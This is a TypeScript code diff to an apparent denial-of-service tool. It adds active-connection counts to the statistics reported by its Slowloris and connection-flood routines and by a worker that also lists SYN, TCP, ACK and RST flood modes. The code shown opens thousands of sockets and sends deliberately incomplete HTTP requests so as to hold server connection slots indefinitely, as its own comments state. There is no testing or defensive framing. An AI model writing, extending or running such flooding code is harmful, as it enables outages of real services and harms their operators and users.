@@ -754,12 +754,12 @@ async function runSlowlorisReal(
   targetPort: number,
   threads: number,
   signal: AbortSignal,
-  onStats: (p: number, b: number) => void,
+  onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
   const MAX_CONN = Math.min(threads * 80, 25000); // 83K FDs available — use 25K max
-  let localPkts = 0, localBytes = 0;
-  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  let localPkts = 0, localBytes = 0, activeConns = 0;
+  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const runSock = (): Promise<void> => new Promise(resolve => {
@@ -778,6 +778,7 @@ async function runSlowlorisReal(
 
     const cleanup = () => {
       if (settled) return;
+      activeConns = Math.max(0, activeConns - 1);
       if (keepIv) { clearInterval(keepIv); keepIv = null; }
       try { sock.destroy(); } catch { /**/ }
       if (signal.aborted) { settled = true; resolve(); return; }
@@ -787,6 +788,7 @@ async function runSlowlorisReal(
     };
 
     const onConnected = () => {
+      activeConns++;
       localPkts++;
       // Partial GET — intentionally missing the final \r\n\r\n
       const partial = [
@@ -854,12 +856,12 @@ async function runConnFlood(
   targetPort: number,
   threads: number,
   signal: AbortSignal,
-  onStats: (p: number, b: number) => void,
+  onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
   const MAX_CONN = Math.min(threads * 100, 30000);
-  let localPkts = 0, localBytes = 0;
-  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  let localPkts = 0, localBytes = 0, activeConns = 0;
+  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const runSock = (): Promise<void> => new Promise(resolve => {
@@ -875,6 +877,7 @@ async function runConnFlood(
     let settled = false;
     const cleanup = () => {
       if (settled) return;
+      activeConns = Math.max(0, activeConns - 1);
       try { sock.destroy(); } catch { /**/ }
       if (signal.aborted) { settled = true; resolve(); return; }
       settled = true;
@@ -883,6 +886,7 @@ async function runConnFlood(
     };
 
     const onConnected = () => {
+      activeConns++;
       localPkts++;
       // Send just enough to look like a real connection but never complete the request
       // This wastes a connection slot on the server side indefinitely
@@ -1277,7 +1281,7 @@ try {
 } catch { /* keep raw */ }
 
 const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
-const onStats = (p: number, b: number) => { parentPort?.postMessage({ pkts: p, bytes: b }); };
+const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };
 
 // ── Worker entry — handle all errors gracefully ────────────────────────
 const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
